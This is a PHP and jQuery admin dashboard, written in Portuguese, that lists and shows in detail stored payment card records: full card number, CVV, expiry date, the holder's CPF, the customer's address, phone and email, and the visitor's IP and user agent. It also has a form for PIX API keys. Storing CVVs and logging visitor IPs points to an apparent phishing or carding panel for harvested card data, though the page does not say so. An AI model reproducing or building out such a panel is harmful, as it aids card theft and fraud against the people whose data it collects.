<?php
require_once __DIR__ . '/auth_check.php';
$user = JWT::getUser();
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Admin</title>
    <link href="../public/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {
            background: #f5f5f5;
        }
        .sidebar {
            background: #64268c;
            color: white;
            min-height: 100vh;
            padding: 20px;
            position: fixed;
            width: 250px;
        }
        .sidebar h3 {
            margin-bottom: 30px;
            text-align: center;
        }
        .sidebar ul {
            list-style: none;
            padding: 0;
        }
        .sidebar ul li {
            margin-bottom: 10px;
        }
        .sidebar ul li a {
            color: white;
            text-decoration: none;
            padding: 10px;
            display: block;
            border-radius: 5px;
            transition: background 0.3s;
        }
        .sidebar ul li a:hover,
        .sidebar ul li a.active {
            background: rgba(255,255,255,0.2);
        }
        .main-content {
            margin-left: 250px;
            padding: 30px;
        }
        .card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        .card-header {
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .card-header h4 {
            margin: 0;
            color: #64268c;
        }
        .table {
            margin-top: 20px;
        }
        .table th {
            background: #64268c;
            color: white;
        }
        .btn-primary {
            background: #64268c;
            border: none;
        }
        .btn-primary:hover {
            background: #8b3db8;
        }
        .btn-logout {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
        }
        .btn-logout:hover {
            background: #c82333;
            color: white;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
        }
        .form-control:focus {
            border-color: #64268c;
            box-shadow: 0 0 0 0.2rem rgba(100, 38, 140, 0.25);
        }
        .alert {
            margin-bottom: 20px;
        }
        .badge {
            padding: 5px 10px;
            border-radius: 5px;
        }
        .badge-success {
            background: #28a745;
            color: white;
        }
        .btn-action {
            padding: 5px 10px;
            margin: 0 2px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }
        .btn-view {
            background: #17a2b8;
            color: white;
        }
        .btn-view:hover {
            background: #138496;
        }
        .btn-delete {
            background: #dc3545;
            color: white;
        }
        .btn-delete:hover {
            background: #c82333;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            overflow: auto;
        }
        .modal-content {
            background-color: #fefefe;
            margin: 5% auto;
            padding: 30px;
            border: none;
            border-radius: 10px;
            width: 90%;
            max-width: 700px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .modal-header {
            border-bottom: 2px solid #64268c;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .modal-header h3 {
            color: #64268c;
            margin: 0;
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: #000;
        }
        .detail-row {
            display: flex;
            padding: 10px 0;
            border-bottom: 1px solid #e0e0e0;
        }
        .detail-label {
            font-weight: bold;
            width: 200px;
            color: #64268c;
        }
        .detail-value {
            flex: 1;
            word-break: break-word;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3><i class="fas fa-shield-alt"></i> Admin Panel</h3>
        <ul>
            <li><a href="dashboard.php" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard</a></li>
            <li><a href="#" onclick="showCardData()"><i class="fas fa-credit-card"></i> Dados de Cartão</a></li>
            <li><a href="#" onclick="showPixConfig()"><i class="fas fa-cog"></i> Configurações PIX</a></li>
            <li><a href="logout.php" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Sair</a></li>
        </ul>
    </div>
    
    <div class="main-content">
        <div class="card">
            <div class="card-header">
                <h4><i class="fas fa-tachometer-alt"></i> Dashboard</h4>
            </div>
            <p>Bem-vindo, <strong><?php echo htmlspecialchars($user['username']); ?></strong>!</p>
        </div>
        
        <!-- Seção de Dados de Cartão -->
        <div class="card" id="card-data-section" style="display: none;">
            <div class="card-header">
                <h4><i class="fas fa-credit-card"></i> Dados de Cartão de Crédito</h4>
            </div>
            <div id="card-data-content">
                <p>Carregando dados...</p>
            </div>
        </div>
        
        <!-- Seção de Configurações PIX -->
        <div class="card" id="pix-config-section" style="display: none;">
            <div class="card-header">
                <h4><i class="fas fa-cog"></i> Configurações da API PIX</h4>
            </div>
            <div id="pix-config-content">
                <form id="pix-config-form">
                    <div class="form-group">
                        <label for="public_key">Chave Pública</label>
                        <input type="text" class="form-control" id="public_key" name="public_key" required>
                    </div>
                    <div class="form-group">
                        <label for="secret_key">Chave Secreta</label>
                        <input type="password" class="form-control" id="secret_key" name="secret_key" required>
                    </div>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-save"></i> Salvar Credenciais
                    </button>
                </form>
                <div id="pix-config-message" style="margin-top: 20px;"></div>
            </div>
        </div>
    </div>
    
    <!-- Modal para visualizar dados completos -->
    <div id="cardDetailModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="close">&times;</span>
                <h3><i class="fas fa-credit-card"></i> Dados Completos do Cartão</h3>
            </div>
            <div id="card-detail-content">
                <p>Carregando...</p>
            </div>
        </div>
    </div>
    
    <script src="../public/js/jquery.min.js"></script>
    <script>

        if (typeof jQuery === 'undefined') {
            console.error('jQuery não está carregado!');
        }


        window.loadCardData = function() {
            if (typeof jQuery === 'undefined' || typeof $ === 'undefined') {
                console.error('jQuery não está disponível!');
                return;
            }
            $('#card-data-content').html('<p>Carregando dados...</p>');
            
            $.ajax({
                url: 'api/get_card_data.php',
                method: 'GET',
                success: function(response) {
                    if (response.success && response.data.length > 0) {
                        let html = '<table class="table table-striped">';
                        html += '<thead><tr><th>Data/Hora</th><th>Últimos 4 dígitos</th><th>Nome</th><th>CPF</th><th>Bandeira</th><th>Valor</th><th>IP</th><th>Ações</th></tr></thead>';
                        html += '<tbody>';
                        
                        response.data.forEach(function(item) {

                            if (!item.id) {
                                console.warn('Item sem ID encontrado:', item);
                                return;
                            }

                            var cardId = item.id;
                            var cardIdEscaped = cardId.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
                            
                            html += '<tr>';
                            html += '<td>' + (item.timestamp || '-') + '</td>';
                            html += '<td>****' + (item.card_number_last4 || (item.card_number ? item.card_number.slice(-4) : '-')) + '</td>';
                            html += '<td>' + (item.card_name || '-') + '</td>';
                            html += '<td>' + (item.card_cpf || '-') + '</td>';
                            html += '<td><span class="badge badge-success">' + (item.card_brand || 'unknown') + '</span></td>';
                            html += '<td>R$ ' + parseFloat(item.amount || 0).toFixed(2).replace('.', ',') + '</td>';
                            html += '<td>' + (item.ip || '-') + '</td>';
                            html += '<td>';
                            html += '<button class="btn-action btn-view" data-card-id="' + cardIdEscaped + '" title="Visualizar"><i class="fas fa-eye"></i> Visualizar</button>';
                            html += '<button class="btn-action btn-delete" data-card-id="' + cardIdEscaped + '" title="Excluir"><i class="fas fa-trash"></i> Excluir</button>';
                            html += '</td>';
                            html += '</tr>';
                        });
                        
                        html += '</tbody></table>';
                        $('#card-data-content').html(html);
                    } else {
                        $('#card-data-content').html('<p class="alert alert-info">Nenhum dado de cartão encontrado.</p>');
                    }
                },
                error: function() {
                    $('#card-data-content').html('<p class="alert alert-danger">Erro ao carregar dados.</p>');
                }
            });
        };
        
        window.loadPixConfig = function() {
            $.ajax({
                url: 'api/get_pix_credentials.php',
                method: 'GET',
                success: function(response) {
                    if (response.success) {
                        $('#public_key').val(response.data.public_key || '');
                        $('#secret_key').val(response.data.secret_key || '');
                    }
                }
            });
        };
        
        window.showCardData = function() {
            if (typeof jQuery === 'undefined' || typeof $ === 'undefined') {
                console.error('jQuery não está disponível!');
                return;
            }
            $('#pix-config-section').hide();
            $('#card-data-section').show();
            window.loadCardData();
        };
        
        window.showPixConfig = function() {
            if (typeof jQuery === 'undefined' || typeof $ === 'undefined') {
                console.error('jQuery não está disponível!');
                return;
            }
            $('#card-data-section').hide();
            $('#pix-config-section').show();
            window.loadPixConfig();
        };
        
        $(document).ready(function() {
            $('#pix-config-form').on('submit', function(e) {
                e.preventDefault();
                
                const data = {
                    public_key: $('#public_key').val(),
                    secret_key: $('#secret_key').val()
                };
                
                $.ajax({
                    url: 'api/save_pix_credentials.php',
                    method: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify(data),
                    success: function(response) {
                        if (response.success) {
                            $('#pix-config-message').html('<div class="alert alert-success">Credenciais salvas com sucesso!</div>');
                        } else {
                            $('#pix-config-message').html('<div class="alert alert-danger">Erro: ' + (response.error || 'Erro desconhecido') + '</div>');
                        }
                    },
                    error: function() {
                        $('#pix-config-message').html('<div class="alert alert-danger">Erro ao salvar credenciais.</div>');
                    }
                });
            });

            $(document).on('click', '.btn-view', function() {
                var cardId = $(this).data('card-id');
                if (cardId) {
                    window.viewCardDetail(cardId);
                } else {
                    alert('Erro: ID do cartão não encontrado.');
                }
            });
            
            $(document).on('click', '.btn-delete', function() {
                var cardId = $(this).data('card-id');
                if (cardId) {
                    window.deleteCardData(cardId);
                } else {
                    alert('Erro: ID do cartão não encontrado.');
                }
            });

            $('.close').on('click', function() {
                $('#cardDetailModal').hide();
            });

            $(window).on('click', function(event) {
                if ($(event.target).is('#cardDetailModal')) {
                    $('#cardDetailModal').hide();
                }
            });
        });

        window.viewCardDetail = function(cardId) {
            $('#card-detail-content').html('<p>Carregando...</p>');
            $('#cardDetailModal').show();
            
            $.ajax({
                url: 'api/get_card_detail.php?id=' + encodeURIComponent(cardId),
                method: 'GET',
                success: function(response) {
                    if (response.success && response.data) {
                        let data = response.data;
                        let customer = data.customer_data || {};
                        
                        let html = '<div class="detail-row"><div class="detail-label">Data/Hora:</div><div class="detail-value">' + (data.timestamp || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Número do Cartão:</div><div class="detail-value">' + (data.card_number || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Nome do Titular:</div><div class="detail-value">' + (data.card_name || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">CPF do Titular:</div><div class="detail-value">' + (data.card_cpf || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">CVV:</div><div class="detail-value">' + (data.card_cvv || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Validade:</div><div class="detail-value">' + (data.card_validity || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Bandeira:</div><div class="detail-value">' + (data.card_brand || 'unknown') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Valor:</div><div class="detail-value">R$ ' + parseFloat(data.amount || 0).toFixed(2).replace('.', ',') + '</div></div>';
                        
                        html += '<div style="margin-top: 30px; padding-top: 20px; border-top: 2px solid #64268c;"><h4 style="color: #64268c; margin-bottom: 15px;">Dados do Cliente</h4>';
                        html += '<div class="detail-row"><div class="detail-label">Nome:</div><div class="detail-value">' + (customer.nome || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">E-mail:</div><div class="detail-value">' + (customer.email || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">CPF:</div><div class="detail-value">' + (customer.cpf || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Telefone:</div><div class="detail-value">' + (customer.telefone || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Endereço:</div><div class="detail-value">' + (customer.endereco || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Número:</div><div class="detail-value">' + (customer.numero || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Complemento:</div><div class="detail-value">' + (customer.complemento || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Bairro:</div><div class="detail-value">' + (customer.bairro || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Cidade:</div><div class="detail-value">' + (customer.cidade || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">Estado:</div><div class="detail-value">' + (customer.estado || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">CEP:</div><div class="detail-value">' + (customer.cep || '-') + '</div></div>';
                        html += '</div>';
                        
                        html += '<div style="margin-top: 30px; padding-top: 20px; border-top: 2px solid #64268c;"><h4 style="color: #64268c; margin-bottom: 15px;">Informações Técnicas</h4>';
                        html += '<div class="detail-row"><div class="detail-label">IP:</div><div class="detail-value">' + (data.ip || '-') + '</div></div>';
                        html += '<div class="detail-row"><div class="detail-label">User Agent:</div><div class="detail-value">' + (data.user_agent || '-') + '</div></div>';
                        html += '</div>';
                        
                        $('#card-detail-content').html(html);
                    } else {
                        $('#card-detail-content').html('<p class="alert alert-danger">Erro ao carregar dados.</p>');
                    }
                },
                error: function() {
                    $('#card-detail-content').html('<p class="alert alert-danger">Erro ao carregar dados.</p>');
                }
            });
        };
        
        window.deleteCardData = function(cardId) {
            if (!cardId) {
                alert('Erro: ID não fornecido.');
                return;
            }
            
            if (!confirm('Tem certeza que deseja excluir este registro?')) {
                return;
            }
            
            $.ajax({
                url: 'api/delete_card_data.php',
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ id: cardId }),
                success: function(response) {
                    if (response.success) {
                        alert('Registro excluído com sucesso!');
                        window.loadCardData();
                    } else {
                        alert('Erro ao excluir: ' + (response.error || 'Erro desconhecido'));
                    }
                },
                error: function(xhr, status, error) {
                    console.error('Erro na requisição:', {xhr: xhr, status: status, error: error});
                    alert('Erro ao excluir registro. Verifique o console para mais detalhes.');
                }
            });
        };
    </script>
</body>
</html>

